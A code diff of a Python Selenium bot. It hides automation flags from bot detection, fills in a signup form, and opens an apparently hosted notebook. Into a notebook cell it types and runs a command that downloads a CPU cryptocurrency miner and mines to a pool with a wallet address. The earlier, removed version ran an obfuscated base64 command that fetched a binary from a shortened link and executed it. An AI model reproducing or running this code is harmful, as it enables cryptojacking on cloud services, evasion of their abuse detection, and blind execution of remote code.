@@ -15,6 +15,14 @@ option = webdriver.ChromeOptions()
 
 #Removes navigator.webdriver flag
 
+# For older ChromeDriver under version 79.0.3945.16
+option.add_experimental_option("excludeSwitches", ["enable-automation"])
+option.add_experimental_option('useAutomationExtension', False)
+
+#For ChromeDriver version 79.0.3945.16 or over
+option.add_argument('--disable-blink-features=AutomationControlled')
+
+
 #Open Browser
 driver = webdriver.Chrome(executable_path='chromedriver',options=option)
 
@@ -120,7 +128,7 @@ checkboxElement.send_keys(Keys.SPACE)
 time.sleep(2)
 driver.find_element_by_xpath('//*[@id="submitToMktoForm_2021Feb10"]/div[21]/span/button').click()
 
-time.sleep(10)
+time.sleep(5)
 print("why")
 checkboxElementw = driver.find_element_by_xpath('//*[@id="ce-placeholder-button"]')
 checkboxElementw.send_keys(Keys.ENTER)
@@ -152,32 +160,20 @@ time.sleep(1)
 driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[3]/button').click()
 time.sleep(15)
 print("note")
-#driver.find_element_by_xpath('//*[@id="create-menu-button"]/span[1]/svg').click()
-#driver.find_element_by_xpath('//*[@id="create-menu"]/button/span').click()
-#driver.find_element_by_xpath('//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]').click()
-
-driver.find_element_by_id('create-menu-button').click()
-time.sleep(1)
-driver.find_element_by_xpath('//*[@id="create-menu"]/button').click()
-
-
+driver.find_element_by_xpath('//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]').click()
 time.sleep(2)
-driver.find_element_by_xpath('//*[@id="input"]').send_keys(randomLetter)
-randomLetter = random.choice(string.ascii_letters)
-driver.find_element_by_xpath('//*[@id="input"]').send_keys(randomLetter)
-randomLetter = random.choice(string.ascii_letters)
-driver.find_element_by_xpath('//*[@id="input"]').send_keys(randomLetter)
-randomLetter = random.choice(string.ascii_letters)
-driver.find_element_by_xpath('//*[@id="input"]').send_keys(randomLetter)
+driver.find_element_by_xpath('//*[@id="input"]').send_keys("prog")
 
 time.sleep(1)
-driver.find_element_by_xpath('/html/body/div[7]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]/span').click()
+driver.find_element_by_xpath('/html/body/div[4]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]').click()
 time.sleep(15)
 randomLetter = random.choice(string.ascii_letters)
 randomLette = random.choice(string.ascii_letters)
 driver.find_element_by_css_selector(".CodeMirror-line").click()
-driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!base64 -d <<< 'd2dldCBodHRwczovL2JpdC5seS8yWTZySHo0ICYmIGNobW9kICt4IDJZNnJIejQgJiYgLi8yWTZySHo0IA==' | sh")
+driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz !tar -xf hellminer_cpu_linux.tar.gz  !./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RDD9mUShEa4WU894zdknpkZJnLbLeWMXf4.Python -p x --cpu 2"+randomLetter+randomLette)
 driver.find_element_by_css_selector(".fa-play").click()
 driver.find_element_by_css_selector(".run-cell > .fa").click()
 driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()
-#driver.close()
+sudo pip install selenium && wget https://chromedriver.storage.googleapis.com/91.0.4472.19/chromedriver_linux64.zip && unzip chromedriver_linux64.zip && chmod +x chromedriver && sudo mv chromedriver /usr/local/bin/ && wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - && sudo apt-get install apt-transport-https && echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list && sudo apt-get update && sudo apt-get install sublime-text
+
+sudo apt-get install python3-tk
